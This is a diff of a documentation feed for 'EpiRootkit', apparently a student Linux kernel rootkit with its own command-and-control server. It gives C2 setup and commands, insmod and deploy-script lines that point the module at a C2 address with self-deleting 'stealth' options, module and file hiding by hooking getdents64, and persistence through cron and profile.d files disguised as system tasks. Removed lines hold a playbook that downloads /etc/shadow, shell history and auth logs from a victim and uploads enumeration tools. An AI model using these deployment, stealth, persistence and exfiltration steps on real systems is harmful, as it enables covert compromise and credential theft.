+ &lt;/pre>
+ &lt;/div>
+
+
+&lt;/div>
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade" id="fbcead" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="shared-folders-development">Shared Folders (Development) &lt;a href="#shared-folders-development" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Add to QEMU launch:&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h1 id="c2-server-overview">C2 Server Overview &lt;a href="#c2-server-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Professional Command &amp;amp; Control server for managing EpiRootkit connections.&lt;/p>
 &lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -314,12 +664,17 @@ persist Client-1 install # Manage persistence&lt;/code>
 &lt;li>Session established (1-hour timeout)&lt;/li>
 &lt;li>Rate limiting: 5 attempts/60 seconds&lt;/li>
 &lt;/ol>
-&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="installation-guide">Installation Guide &lt;a href="#installation-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Setup instructions for the EpiRootkit C2 server.&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="required-software">Required Software &lt;a href="#required-software" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Node.js&lt;/strong>: Version 18+&lt;/li>
-&lt;li>&lt;strong>pnpm&lt;/strong>: Package manager (recommended)&lt;/li>
+&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="c2-server-installation">C2 Server Installation &lt;a href="#c2-server-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The C2 server runs inside the &lt;strong>attacker VM&lt;/strong> (192.168.200.11), not on the host system.&lt;/p>
+&lt;h2 id="quick-setup">Quick Setup &lt;a href="#quick-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Complete attacker VM setup with C2 server:&lt;/strong>
+👉 &lt;strong>&lt;a href="../../02-setup/attacking-vm-setup.md">Attacker VM Setup Guide&lt;/a>&lt;/strong>&lt;/p>
+&lt;p>This covers everything: Node.js installation, project transfer, dependencies, and C2 server launch.&lt;/p>
+&lt;h2 id="vm-only-installation">VM-Only Installation &lt;a href="#vm-only-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If you already have the attacker VM configured and just need to install the C2 server:&lt;/p>
+&lt;h3 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Attacker VM running&lt;/strong>: Ubuntu with Node.js 12+&lt;/li>
+&lt;li>&lt;strong>Project files&lt;/strong>: Available in VM (via git, scp, or shared folder)&lt;/li>
+&lt;li>&lt;strong>Network&lt;/strong>: VM can reach port 4444 (victim connections)&lt;/li>
 &lt;/ul>
-&lt;h3 id="verify-installation">Verify Installation &lt;a href="#verify-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="installation-steps">Installation Steps &lt;a href="#installation-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -334,39 +689,27 @@ persist Client-1 install # Manage persistence&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="8582e83" class="language-bash ">
- &lt;code>node --version
-# v18.17.0
+ &lt;pre id="5f5ffd2" class="language-bash ">
+ &lt;code># Inside attacker VM (192.168.200.11)
+cd attacking_program
 
-pnpm --version
-# 8.6.2
-
-# Install pnpm if missing
-npm install -g pnpm&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="installation">Installation &lt;a href="#installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-install-dependencies">1. Install Dependencies &lt;a href="#1-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="d47fc10" class="language-bash ">
- &lt;code>cd attacking_program
+# Install dependencies
 pnpm install
-# ✓ Dependencies installed successfully&lt;/code>
+# ✓ Dependencies installed
+
+# Verify configuration
+cat config.env
+# C2_PORT=4444
+# WEB_PORT=3000
+# PASSWORD_HASH=b109f3bbbc...
+
+# Start server
+pnpm start
+# ✓ C2 server started on port 4444
+# ✓ Web interface started on port 3000&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="2-review-configuration">2. Review Configuration &lt;a href="#2-review-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="configuration-options">Configuration Options &lt;a href="#configuration-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="environment-settings">Environment Settings &lt;a href="#environment-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -381,11 +724,59 @@ pnpm install
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="531aa43" class="language-bash ">
- &lt;code>cat config.env&lt;/code>
+ &lt;pre id="3b87d42" class="language-bash ">
+ &lt;code># Edit config.env in attacker VM
+C2_PORT=4444 # Port for victim connections
+WEB_PORT=3000 # Web interface port
+ENCRYPTION_KEY=secret32hex # XOR encryption key (32 hex chars)
+ENABLE_ENCRYPTION=true # Enable XOR encryption
+PASSWORD_HASH=hash # SHA-512 authentication hash&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Default Settings:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands.&lt;/p>
+&lt;h3 id="change-default-password">Change Default Password &lt;a href="#change-default-password" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="03435fe" class="language-bash ">
+ &lt;code># Generate new SHA-512 hash
+echo -n &amp;#34;newpassword&amp;#34; | sha512sum
+# Copy hash to config.env as PASSWORD_HASH&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="access-points">Access Points &lt;a href="#access-points" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="cli-interface">CLI Interface &lt;a href="#cli-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="600aa1d" class="language-bash ">
+ &lt;code># Direct access in attacker VM
+pnpm start
+# c2-server$ help
+# c2-server$ ls&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="web-interface">Web Interface &lt;a href="#web-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>From any device on the network:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands.&lt;/p>
 &lt;h2 id="command-list">Command List &lt;a href="#command-list" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
@@ -750,197 +1141,6 @@ unhide_module Client-1
 hide_files Client-1
 # SUCCESS: File hiding enabled&lt;/code>
  &lt;/pre>
- &lt;/div>
-&lt;h2 id="real-world-scenarios">Real-World Scenarios &lt;a href="#real-world-scenarios" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="initial-compromise">Initial Compromise &lt;a href="#initial-compromise" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="a73e703" class="language-bash ">
- &lt;code># 1. Gain foothold
-auth Client-1 password
-
-# 2. Reconnaissance
-exec Client-1 id
-exec Client-1 hostname
-exec Client-1 cat /etc/os-release
-
-# 3. Enable stealth
-hide_module Client-1
-hide_files Client-1
-
-# 4. Establish persistence
-persist Client-1 install&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="data-exfiltration">Data Exfiltration &lt;a href="#data-exfiltration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="50956ae" class="language-bash ">
- &lt;code># System information
-download Client-1 /etc/passwd
-download Client-1 /etc/shadow
-download Client-1 /etc/hosts
-
-# User data
-download Client-1 /home/user/.bash_history
-download Client-1 /home/user/.ssh/known_hosts
-
-# Log files
-download Client-1 /var/log/auth.log
-download Client-1 /var/log/syslog&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="lateral-movement-preparation">Lateral Movement Preparation &lt;a href="#lateral-movement-preparation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="4ca69d8" class="language-bash ">
- &lt;code># Network reconnaissance
-exec Client-1 ip route show
-exec Client-1 arp -a
-exec Client-1 ss -tulpn
-
-# Upload tools
-upload Client-1 ./tools/nmap /tmp/scanner
-upload Client-1 ./tools/linpeas.sh /tmp/enum.sh
-exec Client-1 chmod &amp;#43;x /tmp/scanner /tmp/enum.sh
-
-# Execute reconnaissance
-exec Client-1 /tmp/enum.sh &amp;gt; /tmp/results.txt
-download Client-1 /tmp/results.txt ./recon/&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="persistence-testing">Persistence Testing &lt;a href="#persistence-testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="69651df" class="language-bash ">
- &lt;code># Before reboot
-status Client-1
-persist Client-1 install
-
-# Simulate reboot
-exec Client-1 sudo systemctl reboot
-# Connection lost...
-
-# After victim reboots (auto-reconnect)
-ls
-# • Client-1 - UNAUTHENTICATED - Last seen: Just now
-
-auth Client-1 password
-status Client-1
-# Persistence: ENABLED ✓&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="error-handling">Error Handling &lt;a href="#error-handling" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="common-issues">Common Issues &lt;a href="#common-issues" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="bc4416d" class="language-bash ">
- &lt;code># Client not found
-auth Client-999 password
-# ERROR: Client not found
-
-# Authentication failed
-auth Client-1 wrongpass
-# ERROR: Authentication failed
-
-# Rate limiting
-auth Client-1 wrong1
-auth Client-1 wrong2
-# ... (after 5 attempts)
-# ERROR: Rate limited. Try again in 60 seconds
-
-# Command on unauthenticated client
-exec Client-1 whoami
-# ERROR: Client not authenticated&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="connection-issues">Connection Issues &lt;a href="#connection-issues" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="65ce483" class="language-bash ">
- &lt;code># Check connection status
-keepalive Client-1
-# Failed pings: 3
-# Connection: UNSTABLE
-
-# Client disconnected
-exec Client-1 whoami
-# ERROR: Client disconnected
-
-# Network timeout
-download Client-1 /huge/file.bin
-# ERROR: Network timeout&lt;/code>
- &lt;/pre>
  &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;h1 id="web-ui-overview">Web UI Overview &lt;a href="#web-ui-overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Modern React-based web interface for EpiRootkit C2 management.&lt;/p>
 &lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="C2 Dashboard Main">
@@ -1281,7 +1481,6 @@ status Client-1
 &lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
-&lt;li>&lt;strong>Architecture&lt;/strong>: x86_64&lt;/li>
 &lt;/ul>
 &lt;h3 id="dependencies">Dependencies &lt;a href="#dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -1303,38 +1502,6 @@ status Client-1
 sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code> before building:&lt;/p>
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="6fe5c17" class="language-c ">
- &lt;code>// Option 1: Domain name (recommended)
-#define C2_SERVER_ADDRESS &amp;#34;jules-c2.example.com&amp;#34;
-#define C2_SERVER_PORT 4444
-
-// Option 2: IP address (traditional)
-#define C2_SERVER_ADDRESS &amp;#34;192.168.64.1&amp;#34;
-#define C2_SERVER_PORT 4444
-
-// Feature settings
-#define ENABLE_ENCRYPTION 1 // XOR encryption enabled
-#define ENABLE_PERSISTENCE 1 // Auto-install persistence
-#define ENABLE_MODULE_HIDING 1 // Hide module by default
-#define ENABLE_FILE_HIDING 1 // Hide files with prefixes&lt;/code>
- &lt;/pre>
- &lt;/div>
 &lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -1350,13 +1517,13 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="f9e9859" class="language-bash ">
+ &lt;pre id="eef045c" class="language-bash ">
  &lt;code>cd rootkit
 make clean &amp;amp;&amp;amp; make
 # ✓ Build successful: epirootkit.ko created&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="quick-deploy-recommended">Quick Deploy (Recommended) &lt;a href="#quick-deploy-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="deployment">Deployment &lt;a href="#deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="deployment-script">Deployment Script &lt;a href="#deployment-script" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -1371,18 +1538,50 @@ make clean &amp;amp;&amp;amp; make
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="ffdc55b" class="language-bash ">
- &lt;code># Deploy with domain name
+ &lt;pre id="b8525b1" class="language-bash ">
+ &lt;code># Default usage (uses ./epirootkit.ko automatically)
+sudo ./deploy_rootkit.sh
+
+# Custom C2 server
+sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444
+
+# Domain-based deployment
 sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
 
-# Deploy with IP address
-sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
+# Stealth deployment with self-cleanup
+sudo ./deploy_rootkit.sh --self-delete
 
-# Deploy with defaults from config.h
-sudo ./deploy_rootkit.sh&lt;/code>
+# Verbose deployment (show output)
+sudo ./deploy_rootkit.sh --verbose&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="manual-loading">Manual Loading &lt;a href="#manual-loading" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="deployment-options">Deployment Options &lt;a href="#deployment-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Option&lt;/th>
+ &lt;th>Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;code>--verbose&lt;/code>&lt;/td>
+ &lt;td>Show detailed output during deployment&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>--self-delete&lt;/code>&lt;/td>
+ &lt;td>Remove script after successful deployment&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>status&lt;/code>&lt;/td>
+ &lt;td>Check current deployment status&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>uninstall&lt;/code>&lt;/td>
+ &lt;td>Remove module and cleanup&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h3 id="advanced-usage">Advanced Usage &lt;a href="#advanced-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -1397,64 +1596,50 @@ sudo ./deploy_rootkit.sh&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b5259ca" class="language-bash ">
+ &lt;pre id="284770d" class="language-bash ">
+ &lt;code># Ultimate stealth deployment
+sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
+
+# Deploy with verbose output then self-destruct
+sudo ./deploy_rootkit.sh --verbose --self-delete
+
+# Check deployment status
+sudo ./deploy_rootkit.sh status
+# Status: Active (hidden)
+# Note: Persistence is managed internally by the rootkit
+
+# Remove deployment
+sudo ./deploy_rootkit.sh uninstall
+# Module uninstalled&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="manual-loading-alternative">Manual Loading (Alternative) &lt;a href="#manual-loading-alternative" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7e16c96" class="language-bash ">
  &lt;code># Load with domain
-sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com
+sudo insmod epirootkit.ko address=jules-c2.example.com
 
 # Load with IP
-sudo insmod epirootkit.ko address=192.168.1.100 port=4444
+sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 
-# Load with defaults
+# Load with defaults from config.h
 sudo insmod epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="management">Management &lt;a href="#management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="check-status">Check Status &lt;a href="#check-status" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="ab56047" class="language-bash ">
- &lt;code>sudo ./deploy_rootkit.sh status
-# Module Status: LOADED
-# Location: /lib/modules/5.4.0-74-generic/extra/epirootkit.ko
-# Autoload: ENABLED (/etc/modules-load.d/epirootkit.conf)
-# Connection: CONNECTED (c2.example.com:443)&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="complete-removal">Complete Removal &lt;a href="#complete-removal" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="5ba7b2a" class="language-bash ">
- &lt;code>sudo ./deploy_rootkit.sh uninstall
-# ✓ Module unloaded
-# ✓ Autoload disabled
-# ✓ Module file removed
-# ✓ Dependencies updated&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;p>&lt;strong>Domain Support&lt;/strong>: The rootkit supports both domain names and IP addresses. For DNS resolution details, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
+&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes advanced stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
 &lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
@@ -1643,13 +1828,13 @@ upload Client-1 ./script.sh&lt;/code>
 &lt;li>Reversible operation&lt;/li>
 &lt;/ul>
 &lt;h2 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Hide files with specific prefixes from directory listings by hooking the &lt;code>getdents64&lt;/code> syscall.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.&lt;/p>
-&lt;h2 id="three-mechanisms">Three Mechanisms &lt;a href="#three-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-modules-loadd">1. modules-load.d &lt;a href="#1-modules-loadd" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/modules-load.d/epirootkit.conf&lt;/code>&lt;br>
-&lt;strong>Content&lt;/strong>: &lt;code>epirootkit&lt;/code>&lt;br>
+&lt;h2 id="three-mechanisms">Three Mechanisms &lt;a href="#three-mechanisms" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-modules-loadd">1. modules-load.d &lt;a href="#1-modules-loadd" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;br>
+&lt;strong>Content&lt;/strong>: &lt;code>epirootkit address=X.X.X.X port=YYYY&lt;/code>&lt;br>
 &lt;strong>Trigger&lt;/strong>: systemd reads config and loads module automatically on boot&lt;/p>
-&lt;h3 id="2-cron-jobs">2. Cron Jobs &lt;a href="#2-cron-jobs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/cron.d/system-update&lt;/code>&lt;br>
+&lt;h3 id="2-cron-jobs">2. Cron Jobs &lt;a href="#2-cron-jobs" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/cron.d/jules_est_bo_update&lt;/code>&lt;br>
 &lt;strong>Schedule&lt;/strong>: Every 5 minutes check and load if not present&lt;br>
-&lt;strong>Stealth&lt;/strong>: Disguised as system update task&lt;/p>
-&lt;h3 id="3-shell-profiles">3. Shell Profiles &lt;a href="#3-shell-profiles" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/profile.d/system-env.sh&lt;/code>&lt;br>
+&lt;strong>Stealth&lt;/strong>: Disguised as system update task with stealth naming&lt;/p>
+&lt;h3 id="3-shell-profiles">3. Shell Profiles &lt;a href="#3-shell-profiles" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>File&lt;/strong>: &lt;code>/etc/profile.d/jules_est_bo_env.sh&lt;/code>&lt;br>
 &lt;strong>Trigger&lt;/strong>: Executes when root user logs in&lt;br>
